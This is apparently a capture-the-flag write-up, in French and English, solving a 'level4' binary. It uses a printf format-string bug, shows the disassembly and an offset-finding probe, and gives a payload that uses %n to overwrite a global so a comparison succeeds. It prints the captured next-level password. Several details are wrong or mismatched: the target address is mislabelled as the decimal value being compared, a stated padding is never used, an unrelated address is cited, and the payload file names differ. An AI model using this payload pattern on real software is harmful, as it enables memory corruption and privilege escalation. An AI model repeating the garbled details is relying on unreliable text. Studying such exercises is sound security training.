```
objdump -M intel -d level4
```

Nous observons que la fonction main appelle une fonction "n" et une "p"
Qui elle même appelle printf, qui peut être exploitée.

```
08048444 <p>:
 8048444:	55                   	push   ebp
 8048445:	89 e5                	mov    ebp,esp
 8048447:	83 ec 18             	sub    esp,0x18
 804844a:	8b 45 08             	mov    eax,DWORD PTR [ebp+0x8]
 804844d:	89 04 24             	mov    DWORD PTR [esp],eax
 8048450:	e8 eb fe ff ff       	call   8048340 <printf@plt>
```

```
 8048488:	e8 b7 ff ff ff       	call   8048444 <p>
 804848d:	a1 10 98 04 08       	mov    eax,ds:0x8049810
 8048492:	3d 44 55 02 01       	cmp    eax,0x1025544
```
This part is intersting, it makes a comparison, in case it's not equal it jumps to this adress 0x8049810.
The goal is to have this comparison true then we will have succeded.
To achieve this we have to change the value at 0x8049810 using printf.
La seule différence est qu'ici, la comparaison se fait avec un chiffre en "dur" :
0x8049810 -> decimal :16930116

Trouvons notre offset, nous chercherons la valeur ascii de "a" soit 61: (nous avons rajouter des %x car l'offset est plus loin que precedemment)
```
python -c 'print "aaaa %x %x %x %x %x %x %x %x %x %x %x %x %x %x"' | ./level4
aaaa b7ff26b0 bffff754 b7fd0ff4 0 0 bffff718 804848d bffff510 200 b7fd1ac0 b7ff37d0 61616161 20782520 25207825
```
On observe que l'adresse se trouve en 12eme position !


adresse : \x10\x98\x04\x08" ==  (  0x080484da <+54>:	mov    0x804988c,%eax) -> adresse Pointeur 
padding:  "a" * 60 64 - 4 == 60 
modification : %16930112c  -> 16930116 - 4 (adress of m)


```
python -c 'print("\x10\x98\x04\x08" + "%16930112c" + "%12$n")' > /tmp/test12
cat /tmp/12 - | ./level4
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
su level5
```
